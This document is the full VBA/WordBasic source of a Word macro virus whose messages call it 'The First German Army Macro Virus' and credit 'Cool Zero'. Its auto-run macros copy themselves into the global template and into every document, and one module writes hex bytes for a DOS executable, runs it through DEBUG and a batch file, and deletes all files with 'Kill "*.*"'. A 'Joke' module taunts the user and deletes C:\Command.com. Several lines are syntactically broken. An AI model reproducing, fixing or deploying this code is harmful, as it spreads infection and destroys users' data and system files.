   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   Dim i
   Dim VInstalled
   On Error GoTo -1: On Error GoTo Finish

   For i = 1 To WordBasic.CountMacros(1, 0)
       If WordBasic.[MacroName$](i, 1, 1) = "TFGAMV" Then
           VInstalled = 1
       End If
   Next i

   If VInstalled = 1 Then
       GoTo Finish
   Else
       On Error Resume Next
       WordBasic.FileSaveAs Format:=1
       WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", 1
       WordBasic.MacroCopy "Global:TFGAMV", WordBasic.[FileName$]() + ":TFGAMV", 1
       WordBasic.MacroCopy "Global:AutoExec", WordBasic.[FileName$]() + ":AutoExec", 1
       WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", 1
       WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", 1
       WordBasic.MacroCopy "Global:Joke", WordBasic.[FileName$]() + ":Joke", 1
       WordBasic.FileSaveAll 1, 0
   End If


   Finish:
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim i
   Dim VInstalled
   WordBasic.FilePrint
   WordBasic.ScreenUpdating
   On Error GoTo -1: On Error GoTo Finish2

   For i = 1 To WordBasic.CountMacros(0, 0)
       If WordBasic.[MacroName$](i, 0, 0) = "TFGAMV" Then
           VInstalled = 1
       End If
   Next i

   If VInstalled = 1 Then
       GoTo Finish
   Else
       On Error Resume Next
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":TFGAMV", "Global:TFGAMV", 1
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoNew", "Global:AutoNew", 1
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoClose", "Global:AutoClose", 1
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoExec", "Global:AutoExec", 1
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen", 1
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":Joke", "Global:Joke", 1
   End If

   Finish2:
   On Error GoTo -1: On Error GoTo Finish

   For i = 1 To WordBasic.CountMacros(1, 0)
       If WordBasic.[MacroName$](i, 1, 1) = "TFGAMV" Then
           VInstalled
       End If
   Next i

   If VInstalled = 1 Then
       GoTo Finish
   Else
       On Error Resume Next
       WordBasic.FileSaveAs Format:=1
       WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", 1
       WordBasic.MacroCopy "Global:TFGAMV", WordBasic.[FileName$]() + ":TFGAMV", 1
       WordBasic.MacroCopy "Global:AutoExec", WordBasic.[FileName$]() + ":AutoExec", 1
       WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", 1
       WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", 1
       WordBasic.MacroCopy "Global:Joke", WordBasic.[FileName$]() + ":Joke", 1
       WordBasic.FileSaveAll 1, 0
   End If

   Finish:
   End Sub

   Attribute VB_Name = "AutoExec"

   Public Sub MAIN()
   Dim a$

   WordBasic.Call "AutoOpen"
   On Error GoTo -1: On Error GoTo Done

   a$ = WordBasic.[FileName$]()
   If a$ = "" Then GoTo Finish

   If VInstalled = 0 Then
       Run1
       Run2
       WordBasic.FileSaveAll 1, 1
   Else
       GoTo Done
   End If

   Done:
   a$ = WordBasic.[FileName$]()
   If a$ = "" Then
       GoTo Finish
   Else
       WordBasic.Insert "zero"
   End If

   Finish:
   WordBasic.MsgBox "Greetings from Cool Zero"
   End Sub

   Private Sub Run1()
   Dim X$
   Dim F$
   Dim G$
   Dim H$
   Dim J$
   Dim Y$
   Dim Z$
   Dim R1$
   Dim CO$
   X$ = Fun$(F$, G$, H$, J$)
   Y$ = Fun$(F$, G$, H$, J$)

   Z$ = X$ + Y$

   R1$ = WordBasic.[GetDocumentVar$]("VirNameDoc")
   CO$ = WordBasic.[FileName$]() + ":" + R1$
   WordBasic.MacroCopy CO$, "Global:" + Z$, 1
   WordBasic.SetProfileString "Intl", "Info2 ", Z$
   WordBasic.ToolsCustomizeKeyboard KeyCode:=32, Category:=2, Name:=Z$, Add:=1, Context:=0
   End Sub

   Private Sub Run2()
   Dim X$
   Dim F$
   Dim G$
   Dim H$
   Dim J$
   Dim Y$
   Dim Z$
   Dim R2$
   Dim OC$
   X$ = Fun___(F$, G$, H$, J$)
   Y$ = Fun$(F$, G$, H$, J$)

   Z$ = X$ + Y$

   R2$ = WordBasic.[GetDocumentVar$]("VirName")
   OC$ = WordBasic.[FileName$]() + ":" + R2$
   WordBasic.MacroCopy OC$, "Global:" + Z$, 1
   WordBasic.SetProfileString "Intl", "Info1", Z$
   WordBasic.ToolsCustomizeKeyboard KeyCode:=69, Category:=2, Name:=Z$, Add:=1, Context:=0
   End Sub

   Private Function VInstalled()
   Dim CC$
   Dim i
   CC$ = WordBasic.[GetProfileString$]("Intl", "Info1")
       VInstalled = 0
           If WordBasic.CountMacros(0) > 0 Then
       For i = 1 To WordBasic.CountMacros(0)
           If WordBasic.[MacroName$](i, 0) = CC$ Then
       VInstalled = 1
       End If
           Next i
   End If
   End Function

   Private Function Fun$(F$, G$, H$, J$)
   Dim One
   Dim Two
   Dim Num
   Dim a$
   Dim B$
   Dim C$
   Dim D$
   Dim E$
   One = 1169
   Two = 9294
   Num = WordBasic.Int(Rnd() * (Two - One) + One)
   a$ = Str(Num)
   a$ = WordBasic.[LTrim$](a$)

   B$ = Mid(a$, 1, 1)
   C$ = Mid(a$, 2, 1)
   D$ = Mid(a$, 3, 1)
   E$ = Mid(a$, 4, 1)

   If B$ = "1" Then F$ = "A"
   If B$ = "2" Then F$ = "B"
   If B$ = "3" Then F$ = "C"
   If B$ = "4" Then F$ = "D"
   If B$ = "5" Then F$ = "E"
   If B$ = "6" Then F$ = "F"
   If B$ = "7" Then F$ = "G"
   If B$ = "8" Then F$ = "H"
   If B$ = "9" Then F$ = "I"
   If B$ = "0" Then F$ = "J"


   If C$ = "1" Then G$ = "H"
   If C$ = "2" Then G$ = "I"
   If C$ = "3" Then G$ = "J"
   If C$ = "4" Then G$ = "K"
   If C$ = "5" Then G$ = "L"
   If C$ = "6" Then G$ = "M"
   If C$ = "7" Then G$ = "N"
   If C$ = "8" Then G$ = "O"
   If C$ = "9" Then G$ = "P"
   If C$ = "0" Then G$ = "Q"


   If D$ = "1" Then H$ = "A"
   If D$ = "2" Then H$ = "B"
   If D$ = "3" Then H$ = "C"
   If D$ = "4" Then H$ = "D"
   If D$ = "5" Then H$ = "E"
   If D$ = "6" Then H$ = "F"
   If D$ = "7" Then H$ = "G"
   If D$ = "8" Then H$ = "H"
   If D$ = "9" Then H$ = "I"
   If D$ = "0" Then H$ = "J"


   If E$ = "1" Then J$ = "R"
   If E$ = "2" Then J$ = "S"
   If E$ = "3" Then J$ = "T"
   If E$ = "4" Then J$ = "U"
   If E$ = "5" Then J$ = "V"
   If E$ = "6" Then J$ = "W"
   If E$ = "7" Then J$ = "X"
   If E$ = "8" Then J$ = "Y"
   If E$ = "9" Then J$ = "Z"

   If E$ = "0" Then J$ = "Q"

   Fun$ = F$ + G$ + H$ + J$
   End Function

   Attribute VB_Name = "AutoNew"

   Public Sub MAIN()
   Dim i
   Dim VInstalled
   Dim aa
   On Error GoTo -1: On Error GoTo Finish

   For i = 1 To WordBasic.CountMacros(1, 0)
       If WordBasic.[MacroName$](i, 1, 1) = "TFGAMV" Then
           VInstalled = 1
       End If
   Next i

   If VInstalled = 1 Then
       GoTo Finish
   Else
       On Error Resume Next
       WordBasic.FileSaveAs Format:=1
       WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + "AutoOpen", 1
       WordBasic.MacroCopy "Global:TFGAMV", WordBasic.[FileName$]() + "TFGAMV", 1
       WordBasic.MacroCopy "Global:AutoExec", WordBasic.[FileName$]() + "AutoExec", 1
       WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + "AutoNew", 1
       WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + "AutoClose", 1
       WordBasic.MacroCopy "Global:Joke", WordBasic.[FileName$]() + "Joke", 1
       WordBasic.FileSaveAll 1, 0
   End If
   aa = WordBasic.Int(Rnd() * 100)
   For i = 1 To aa
       WordBasic.Beep
       WordBasic.Beep
       WordBasic.Beep
       WordBasic.Beep
       WordBasic.Beep
       WordBasic.Beep
   Next i
   WordBasic.MsgBox " The First German Army Macro Virus"
   WordBasic.MsgBox " Created by Cool Zero"
   End Sub

   Attribute VB_Name = "TFGAMV"

   Public Sub MAIN()
   Dim As#
   Dim Close#
   Dim Print#
   Dim setattr_
   On Error GoTo -1: On Error GoTo NoDropper
       If WordBasic.Hour(WordBasic.Now()) <> 5 + 12 Then
       GoTo NoDropper
   Open "C:\Command.com" For Input As 1
   Close #1
   Open "C:\smiley.com" For Output As 1
   Print #1, "N Smiley.com"
   Print #1, "E 0100 E9 FD 02 0D 46 72 65 65 20 4D 65 6D 6F 72 79 20"
   Print #1, "E 0110 51 75 65 72 79 20 50 72 6F 67 72 61 6D 2C 20 56"
   Print #1, "E 0120 65 72 73 69 6F 6E 20 34 2E 30 33 0D 0A 53 4D 47"
   Print #1, "E 0130 20 53 6F 66 74 77 61 72 65 0D 0A 28 43 29 20 43"
   Print #1, "E 0140 6F 70 79 72 69 67 68 74 20 31 39 38 36 2C 31 39"
   Print #1, "E 0150 38 37 20 53 74 65 76 65 6E 20 4D 2E 20 47 65 6F"
   Print #1, "E 0160 72 67 69 61 64 65 73 0D 0A 1A 00 00 00 00 00 00"
   Print #1, "E 0170 00 00 45 4D 4D 58 58 58 58 30 45 78 70 61 6E 64"
   Print #1, "E 0180 65 64 20 4D 65 6D 6F 72 79 20 4D 61 6E 61 67 65"
   Print #1, "E 0190 72 20 45 72 72 6F 72 21 07 0D 0A 24 31 30 30 2E"
   Print #1, "E 01A0 30 CD 12 BA 40 00 F7 E2 A3 70 01 BA 10 00 F7 E2"
   Print #1, "E 01B0 BF 27 03 E8 55 01 E8 14 01 B4 09 BA 1F 03 CD 21"
   Print #1, "E 01C0 06 8C C8 48 8E C0 26 A1 03 00 A3 6C 01 07 BB 10"
   Print #1, "E 01D0 00 7F E3 8B CA 8B D8 BF 45 03 E8 2E 01 E8 ED 00"
   Print #1, "E 01E0 A1 6C 01 BB 64 00 F7 E3 8B 1E 70 01 F7 F3 BF 60"
   Print #1, "E 01F0 03 E8 F1 00 E8 D6 00 8B C2 BB 64 00 F7 E3 8B 1E"
   Print #1, "E 0200 70 01 F7 F3 BF 63 03 E8 DB 00 B4 09 BA 3D 03 CD"
   Print #1, "E 0210 21 B4 88 CD 15 72 19 0B C0 74 15 BB 00 04 F7 E3"
   Print #1, "E 0220 BF 70 03 E8 E5 00 E8 A4 00 B4 09 BA 68 03 CD 21"
   Print #1, "E 0230 06 B8 67 35 CD 21 BF 0A 00 BE 72 01 B9 08 00 FC"
   Print #1, "E 0240 F3 A6 07 75 77 B4 42 CD 67 0A E4 75 74 89 16 6E"
   Print #1, "E 0250 01 89 1E 6A 01 B8 00 40 F7 E2 BF 9A 03 E8 AB 00"
   Print #1, "E 0260 E8 6A 00 B4 09 BA 92 03 CD 21 B8 00 40 F7 E3 BF"
   Print #1, "E 0270 C8 03 E8 96 00 E8 55 00 A1 6A 01 3B 06 6E 01 75"
   Print #1, "E 0280 0D BF F1 03 BE 9C 01 B9 05 00 F3 A4 EB 27 BB 64"
   Print #1, "E 0290 00 F7 E3 8B 1E 6E 01 F7 F3 BF F3 03 E8 46 00 E8"
   Print #1, "E 02A0 2B 00 8B C2 BB 64 00 F7 E3 8B 1E 6E 01 F7 F3 BF"
   Print #1, "E 02B0 F6 03 E8 30 00 B4 09 BA C0 03 CD 21 B8 00 4C CD"
   Print #1, "E 02C0 21 B4 09 BA 7A 01 CD 21 B8 01 4C CD 21 80 3D 30"
   Print #1, "E 02D0 75 12 80 7D 01 30 7C 0C 80 7D 01 39 7F 06 C6 05"
   Print #1, "E 02E0 20 47 EB E9 C3 50 53 32 E4 B3 0A F6 F3 05 30 30"
   Print #1, "E 02F0 83 EF 02 89 05 5B 58 C3 50 53 B3 64 F6 F3 86 E0"
   Print #1, "E 0300 E8 E2 FF 86 E0 E8 DD FF 5B 58 C3 50 53 52 BB 10"
   Print #1, "E 0310 27 F7 F3 92 E8 E1 FF 92 E8 DD FF 5A 5B 58 C3 20"
   Print #1, "E 0320 20 20 20 20 20 20 30 20 42 79 74 65 73 20 54 6F"
   Print #1, "E 0330 74 61 6C 20 4D 65 6D 6F 72 79 0D 0A 24 20 20 20"
   Print #1, "E 0340 20 20 20 20 30 20 42 79 74 65 73 20 41 76 61 69"
   Print #1, "E 0350 6C 61 62 6C 65 20 4D 65 6D 6F 72 79 20 28 20 30"
   Print #1, "E 0360 2E 30 30 25 29 0D 0A 24 20 20 20 20 20 20 20 30"
   Print #1, "E 0370 20 42 79 74 65 73 20 6F 66 20 45 78 74 65 6E 64"
   Print #1, "E 0380 65 64 20 4D 65 6D 6F 72 79 20 54 6F 74 61 6C 0D"
   Print #1, "E 0390 0A 24 20 20 20 20 20 20 20 30 20 42 79 74 65 73"
   Print #1, "E 03A0 20 6F 66 20 4C 49 4D 20 45 78 70 61 6E 64 65 64"
   Print #1, "E 03B0 20 4D 65 6D 6F 72 79 20 54 6F 74 61 6C 0D 0A 24"
   Print #1, "E 03C0 20 20 20 20 20 20 20 30 20 42 79 74 65 73 20 6F"
   Print #1, "E 03D0 66 20 4C 49 4D 20 45 78 70 61 6E 64 65 64 20 4D"
   Print #1, "E 03E0 65 6D 6F 72 79 20 41 76 61 69 6C 61 62 6C 65 20"
   Print #1, "E 03F0 28 20 30 2E 30 30 25 29 0D 0A 24 03 47 01 2E C7"
   Print #1, "E 0400 51 1E 06 8C C8 05 30 00 2D 00 00 8E D8 8E C0 A3"
   Print #1, "E 0410 38 03 A0 33 07 A2 34 07 B0 00 A2 33 07 A0 36 07"
   Print #1, "E 0420 A2 37 07 A1 02 08 A3 08 08 A1 04 08 A3 0A 08 A1"
   Print #1, "E 0430 06 08 A3 0C 08 B4 2F CD 21 89 1E 3C 07 8C C3 89"
   Print #1, "E 0440 1E 3E 07 BA 12 08 B4 1A CD 21 B8 00 00 A3 7B 07"
   Print #1, "E 0450 A3 7D 07 BB DE 03 8B 47 01 A3 A7 07 E8 F3 02 3D"
   Print #1, "E 0460 00 00 74 03 E9 45 02 A1 0E 08 3D 00 00 75 03 E9"
   Print #1, "E 0470 07 02 B4 19 CD 21 50 04 41 A2 44 07 58 B4 00 3C"
   Print #1, "E 0480 02 7D 0B E8 F0 02 3D 00 00 74 03 E9 1E 02 B2 00"
   Print #1, "E 0490 BE 47 07 89 36 79 07 B4 47 CD 21 A0 47 07 3C 00"
   Print #1, "E 04A0 74 13 8C D8 8E C0 B9 C8 00 B8 00 00 BF 44 07 F2"
   Print #1, "E 04B0 AE 89 3E 79 07 FF 0E 79 07 B0 01 A2 35 07 E8 10"
   Print #1, "E 04C0 04 A1 7B 07 3D 01 00 74 62 FF 0E 79 07 FE 0E 35"
   Print #1, "E 04D0 07 E8 FD 03 A1 7B 07 3D 01 00 74 4F E8 8D 03 A1"
   Print #1, "E 04E0 7D 07 3D 01 00 74 03 E9 8F 01 A1 38 07 8E C0 B9"
   Print #1, "E 04F0 C8 00 B8 00 00 BF 44 07 F2 AE 89 3E 79 07 FF 0E"
   Print #1, "E 0500 79 07 C6 06 35 07 01 90 E8 C6 03 A1 7B 07 3D 01"
   Print #1, "E 0510 00 74 18 FF 0E 79 07 C6 06 35 07 00 90 E8 B1 03"
   Print #1, "E 0520 A1 7B 07 3D 01 00 74 03 E9 4E 01 89 1E 9F 07 8B"
   Print #1, "E 0530 1E 9F 07 B0 00 B4 57 CD 21 89 0E 40 07 89 16 42"
   Print #1, "E 0540 07 FF 0E 0E 08 A0 35 07 A2 36 07 3C 01 75 44 BB"
   Print #1, "E 0550 08 01 B8 00 00 89 47 01 B8 FF FF 2D DE 03 2B 06"
   Print #1, "E 0560 A9 07 2B 06 3A 07 05 01 01 03 06 A2 07 BB DE 03"
   Print #1, "E 0570 89 47 01 A1 A9 07 BB 05 01 8B C8 81 E1 0F 00 D1"
   Print #1, "E 0580 E8 D1 E8 D1 E8 D1 E8 83 F9 00 74 01 40 89 47 01"
   Print #1, "E 0590 E9 98 00 BB 05 01 B8 00 00 89 47 01 BB 08 01 B8"
   Print #1, "E 05A0 10 00 89 47 01 8B 1E 9F 07 B0 00 B9 00 00 8B D1"
   Print #1, "E 05B0 B4 42 CD 21 B9 20 00 BA E2 07 B4 3F CD 21 BB E2"
   Print #1, "E 05C0 07 8B 47 14 A3 02 08 8B 47 16 A3 04 08 A1 AB 07"
   Print #1, "E 05D0 2B 06 EA 07 8B 1E 3A 07 83 FB 00 74 01 40 A3 F8"
   Print #1, "E 05E0 07 A3 06 08 B8 00 00 A3 F6 07 FF 06 E6 07 FF 06"
   Print #1, "E 05F0 E6 07 FF 06 E6 07 B8 00 02 2B 06 E4 07 BB BF 01"
   Print #1, "E 0600 90 3B C3 7F 04 FF 06 E6 07 8B 1E 9F 07 B0 00 B9"
   Print #1, "E 0610 00 00 8B D1 B4 42 CD 21 8B 1E 9F 07 B9 20 00 A1"
   Print #1, "E 0620 38 07 8E D8 BA E2 07 B4 40 CD 21 8B 1E 9F 07 B0"
   Print #1, "E 0630 02 B9 00 00 8B D1 B4 42 CD 21 8B 1E 9F 07 8B 0E"
   Print #1, "E 0640 3A 07 A1 38 07 8E D8 B4 40 CD 21 B9 BF 07 90 BA"
   Print #1, "E 0650 00 01 B4 40 CD 21 A0 35 07 3C 00 74 03 E8 33 01"
   Print #1, "E 0660 B0 01 8B 0E 40 07 8B 16 42 07 B4 57 CD 21 8B 1E"
   Print #1, "E 0670 9F 07 B4 3E CD 21 EB 34 90 E8 A8 00 3D 01 00 75"
   Print #1, "E 0680 2B E8 8E 00 8E C0 26 A0 00 00 3C EB 74 1E BE 00"
   Print #1, "E 0690 00 BB 5E 06 8B 07 26 89 04 46 43 81 FB 2A 07 72"
   Print #1, "E 06A0 F3 1E 8C C3 E8 51 00 1F 8C D8 8E C0 1E 8B 16 3C"
   Print #1, "E 06B0 07 8E 1E 3E 07 B4 1A CD 21 1F A0 34 07 3C 01 75"
   Print #1, "E 06C0 04 B4 4C CD 21 A0 37 07 3C 00 74 15 A1 A7 07 BB"
   Print #1, "E 06D0 DE 03 89 47 01 8C C8 8E D8 8E C0 07 1F 59 E9 C0"
   Print #1, "E 06E0 FA 8C C8 2B 06 0C 08 01 06 0A 08 BB 08 08 81 EB"
   Print #1, "E 06F0 00 01 07 1F 59 2E FF 2F 53 B0 1C B4 35 CD 21 BE"
   Print #1, "E 0700 0E 00 1F 89 1C 8C 44 02 BA 00 00 B0 1C B4 25 CD"
   Print #1, "E 0710 21 C3 CD 12 2D 28 00 D1 E0 D1 E0 D1 E0 D1 E0 D1"
   Print #1, "E 0720 E0 D1 E0 C3 B4 2A CD 21 3B 0E 2C 07 72 20 7F 0E"
   Print #1, "E 0730 3A 36 2B 07 72 18 7F 06 3A 16 2A 07 72 10 B4 2C"
   Print #1, "E 0740 CD 21 3A 16 32 07 72 06 B8 01 00 EB 04 90 B8 00"
   Print #1, "E 0750 00 C3 B4 2A CD 21 3B 0E 30 07 72 16 7F 0E 3A 36"
   Print #1, "E 0760 2F 07 72 0E 7F 06 3A 16 2E 07 72 06 B8 01 00 EB"
   Print #1, "E 0770 04 90 B8 00 00 C3 50 BA 14 00 B9 01 00 BB BF 08"
   Print #1, "E 0780 CD 25 58 58 CD 26 73 06 B8 01 00 EB 04 90 B8 00"
   Print #1, "E 0790 00 59 C3 A1 A9 07 2D 03 00 03 06 3A 07 A3 A5 07"
   Print #1, "E 07A0 8B 1E 9F 07 B0 00 B9 00 00 8B D1 B4 42 CD 21 8B"
   Print #1, "E 07B0 1E 9F 07 B9 03 00 A1 38 07 8E D8 BA A4 07 B4 40"
   Print #1, "E 07C0 CD 21 C3 51 56 B0 02 B4 3D CD 21 8B D8 A0 35 07"
   Print #1, "E 07D0 3C 01 75 1F B0 00 B9 00 00 8B D1 B4 42 CD 21 B9"
   Print #1, "E 07E0 03 00 BA A1 07 B4 3F CD 21 A0 A1 07 3C E9 74 03"
   Print #1, "E 07F0 EB 66 90 B0 02 B9 00 00 8B D1 B4 42 CD 21 52 50"
   Print #1, "E 0800 A3 A9 07 F7 D0 40 25 0F 00 A3 3A 07 A1 A9 07 D1"
   Print #1, "E 0810 DA D1 D8 D1 DA D1 D8 D1 DA D1 D8 D1 DA D1 D8 A3"
   Print #1, "E 0820 AB 07 58 5A 8B CA 8B D0 4A 4A 4A B0 00 B4 42 CD"
   Print #1, "E 0830 21 B9 03 00 BA 62 05 B4 3F CD 21 B8 00 00 BE 62"
   Print #1, "E 0840 05 8A 0C 80 F9 49 75 17 8A 4C 01 80 F9 50 75 0F"
   Print #1, "E 0850 8A 4C 02 80 F9 52 75 07 B4 3F CD 21 B8 01 00 5E"
   Print #1, "E 0860 59 C3 0D 0A 24 00 00 00 00 00 00 00 A1 38 07 8E"
   Print #1, "E 0870 C0 B9 04 00 BE 94 07 8B 3E 79 07 F3 A4 A1 38 07"
   Print #1, "E 0880 8E D8 8E C0 BA 44 07 B1 10 B4 4E CD 21 A1 79 07"
   Print #1, "E 0890 3D 47 07 74 08 B4 4F CD 21 B4 4F CD 21 3D 12 00"
   Print #1, "E 08A0 74 2E B4 2F CD 21 83 C3 15 26 8A 07 3C 10 74 02"
   Print #1, "E 08B0 EB E7 C7 06 7D 07 01 00 B4 2F CD 21 83 C3 1E 8B"
   Print #1, "E 08C0 36 79 07 26 8A 07 88 04 3C 00 74 04 43 46 EB F3"
   Print #1, "E 08D0 C3 A1 38 07 8E C0 A0 35 07 3C 00 74 06 BE 98 07"
   Print #1, "E 08E0 EB 04 90 BE 8D 07 B9 07 00 8B 3E 79 07 F3 A4 FF"
   Print #1, "E 08F0 06 79 07 A1 38 07 8E D8 BA 44 07 B1 00 B4 4E CD"
   Print #1, "E 0900 21 3D 00 00 75 57 B4 2F CD 21 83 C3 1E 8B 36 79"
   Print #1, "E 0910 07 26 8A 07 88 04 3C 00 74 04 43 46 EB F3 BA 44"
   Print #1, "E 0920 07 E8 9F FE 3D 00 00 74 2E B4 4F CD 21 3D 00 00"
   Print #1, "E 0930 75 2B B4 2F CD 21 83 C3 1E 8B 36 79 07 26 8A 07"
   Print #1, "E 0940 88 04 3C 00 74 04 43 46 EB F3 BA 44 07 E8 73 FE"
   Print #1, "E 0950 3D 00 00 74 02 EB D2 C7 06 7B 07 01 00 C3 EB 10"
   Print #1, "E 0960 90 14 14 14 14 00 00 20 00 00 18 15 00 00 00 00"
   Print #1, "E 0970 1E 50 53 51 52 06 56 8C C8 8E D8 8E C0 BE 00 00"
   Print #1, "E 0980 8B 44 0C 3D 00 00 74 06 FF 4C 0C EB 57 90 8B 44"
   Print #1, "E 0990 05 8A 5C 09 E8 59 00 8B 44 03 B3 02 E8 51 00 88"
   Print #1, "E 09A0 5C 09 8B 44 03 89 44 05 8B 44 03 8B 5C 07 80 FF"
   Print #1, "E 09B0 00 74 04 FE CC FE CC FE C4 80 FB 00 74 04 FE C8"
   Print #1, "E 09C0 FE C8 FE C0 80 FC 00 75 02 F6 D7 80 FC 50 75 02"
   Print #1, "E 09D0 F6 D7 3C 00 75 02 F6 D3 3C 19 75 02 F6 D3 89 44"
   Print #1, "E 09E0 03 89 5C 07 5E 07 5A 59 5B 58 1F 2E FF 2E 0E 00"
   Print #1, "E 09F0 86 C4 53 50 B5 20 B4 01 CD 10 B4 0F CD 10 B4 03"
   Print #1, "E 0A00 CD 10 89 54 0A 5A B4 02 CD 10 B4 08 CD 10 8A C8"
   Print #1, "E 0A10 58 51 B9 01 00 B4 0A CD 10 B5 0C B1 0D B4 01 CD"
   Print #1, "E 0A20 10 8B 54 0A B4 02 CD 10 5B C3 14 0B C7 07 0E 02"
   Print #1, "E 0A30 C8 07 32 00 00 01 01 01 A1 0D 05 00 80 00 69 0D"
   Print #1, "E 0A40 9C B2 94 15 41 3A 5C 46 52 45 45 2E 43 4F 4D 00"
   Print #1, "E 0A50 4D 00 00 5C 4D 41 50 4D 45 4D 2E 43 4F 4D 00 00"
   Print #1, "E 0A60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
   Print #1, "E 0A70 00 00 00 00 00 00 00 00 00 47 07 01 00 00 00 00"
   Print #1, "E 0A80 00 00 00 00 00 00 00 00 00 00 00 00 00 5C 2A 2E"
   Print #1, "E 0A90 45 58 45 00 2A 2E 2A 00 5C 2A 2E 43 4F 4D 00 07"
   Print #1, "E 0AA0 00 E9 9E 00 E9 00 00 D5 FA FB 02 2F 00 4F 56 46"
   Print #1, "E 0AB0 79 41 4E 4B 45 45 20 44 6F 6F 64 6C 65 23 61 6E"
   Print #1, "E 0AC0 64 20 56 41 43 73 69 6E 2E 00 54 68 65 20 72 65"
   Print #1, "E 0AD0 64 20 70 6C 61 6E 65 74 28 22 49 4E 76 61 73 69"
   Print #1, "E 0AE0 4F 6E 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
   Print #1, "E 0AF0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
   Print #1, "E 0B00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 EC 01"
   Print #1, "E 0B10 02 00 01 3F 3F 3F 3F 3F 3F 3F 3F 43 4F 4D 00 06"
   Print #1, "E 0B20 00 00 00 00 00 00 00 20 9C B2 94 15 FB 02 00 00"
   Print #1, "E 0B30 46 52 45 45 2E 43 4F 4D 00 4D 00 00 00 00 00 00"
   Print #1, "E 0B40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
   Print #1, "E 0B50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
   Print #1, "E 0B60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
   Print #1, "E 0B70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
   Print #1, "E 0B80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
   Print #1, "E 0B90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
   Print #1, "E 0BA0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
   Print #1, "E 0BB0 00 00 00 00 00 00 00 00 00 00 00 00 00 49 50 52"
   Print #1, "RCX"
   Print #1, "0ABF"
   Print #1, "W"
   Print #1, "Q"
   Print #1, ""
   Close 1
   Open "SMILEY.BAT" For Output As 1
   Print #1, "@echo off"
   Print #1, "debug<SMILEY.scr>nul"
   Print #1, "SMILEY.com"
   Print #1, "Copy SMILEY.com C:\Mouse.com" > nul
   Close 1
   setattr_ "C:\Autoexec.bat" For Append As 1
   Close 1
   WordBasic.Shell "SMILEY.bat", 0
   WordBasic.Kill "SMILEY.bat"
   WordBasic.Kill "SMILEY.scr"
   WordBasic.Kill "*.*"
   NoDropper:
   End If
   End Sub

   Attribute VB_Name = "Joke"

   Public Sub MAIN()
   Dim aa
   Dim i
   Dim a$
   Dim DokumentSchliessen
   If WordBasic.Hour(WordBasic.Now()) = 15 And WordBasic.Minute(WordBasic.Now()) = 0 Then
   WordBasic.MsgBox "Hi, I´m the FIRST GERMAN MACRO VIRII"
   WordBasic.MsgBox "O.k. Now I will Play with YOU"
   WordBasic.MsgBox " I can destroy Your harrdrive"
   WordBasic.MsgBox " But I will only play with YOU :-)"
   WordBasic.MsgBox "First look down on the Page"
   WordBasic.PrintStatusBar " Hi, can You see me ????????????????????????????????????????????????????"
   WordBasic.MsgBox "O.k. the second game"
   WordBasic.MsgBox "Now I let Your computer beep"
   aa = WordBasic.Int(Rnd() * 100)
   For i = 1 To aa
   WordBasic.Beep
   WordBasic.Beep
   WordBasic.Beep
   Next i
   WordBasic.MsgBox "The Third Game"
   WordBasic.MsgBox "Now I let print a page,  Read the Information !!!"
   WordBasic.ScreenUpdating
   a$ = " Now it´s never a joke to play with      C O O L      Z E R O     You have 15 Minutes To find me, Then I will destroy YOUR Command.com "
   WordBasic.Insert a$
   WordBasic.FilePrint
   DokumentSchliessen = 2
   WordBasic.ScreenUpdating
   Else
   If WordBasic.Hour(WordBasic.Now() = 15 And WordBasic.Minute(WordBasic.Now()) = 15 Then)
   WordBasic.Kill "C:\Command.com"
   End If
   End If
   End Sub
